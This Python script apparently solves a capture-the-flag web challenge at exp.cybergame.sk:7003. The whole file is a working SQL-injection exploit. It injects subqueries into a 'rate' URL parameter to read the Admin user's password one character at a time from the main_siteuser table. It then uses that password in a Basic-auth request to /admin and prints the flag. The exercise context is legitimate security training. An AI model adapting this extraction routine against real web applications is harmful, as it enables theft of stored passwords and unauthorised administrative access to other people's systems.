#!/usr/bin/env python3
import base64
import re
import sys
import urllib.parse
import urllib.request


BASE_7003 = "http://exp.cybergame.sk:7003"
ADMIN_USER = "Admin"
FLAG_RE = re.compile(r"SK-CERT\{[^}]+\}")
AGG_RE = re.compile(r'agg-value">([^<]+)')


def get(url, headers=None):
    req = urllib.request.Request(url, headers=headers or {}, method="GET")
    with urllib.request.urlopen(req, timeout=15) as resp:
        return resp.read().decode("utf-8", "replace")


def fetch_aggregate(rate_sql):
    query = urllib.parse.urlencode(
        {
            "aggregate": "Convert",
            "field": "id",
            "rate": rate_sql,
        }
    )
    html = get(f"{BASE_7003}/repository?{query}")
    match = AGG_RE.search(html)
    if not match:
        raise RuntimeError(f"aggregate not found for {rate_sql!r}")
    return float(match.group(1))


def recover_admin_password():
    multiplier = fetch_aggregate("(SELECT 1)")
    length = int(round(fetch_aggregate(
        f"(SELECT LENGTH(password) FROM main_siteuser WHERE username='{ADMIN_USER}')"
    ) / multiplier))
    password = []
    for index in range(1, length + 1):
        code = int(round(fetch_aggregate(
            f"(SELECT unicode(substr(password,{index},1)) FROM main_siteuser WHERE username='{ADMIN_USER}')"
        ) / multiplier))
        password.append(chr(code))
        print(f"[7003] {index:02d}/{length}: {''.join(password)}", flush=True)
    return "".join(password)


def fetch_admin_page(password):
    token = base64.b64encode(f"{ADMIN_USER}:{password}".encode()).decode()
    return get(f"{BASE_7003}/admin", {"Authorization": f"Basic {token}"})


def main():
    password = recover_admin_password()
    print(f"[7003] recovered Admin password: {password}", flush=True)
    html = fetch_admin_page(password)
    print("[7003] /admin response follows:", flush=True)
    print(html)
    match = FLAG_RE.search(html)
    if match:
        print(match.group(0), flush=True)
        return 0
    return 1


if __name__ == "__main__":
    sys.exit(main())
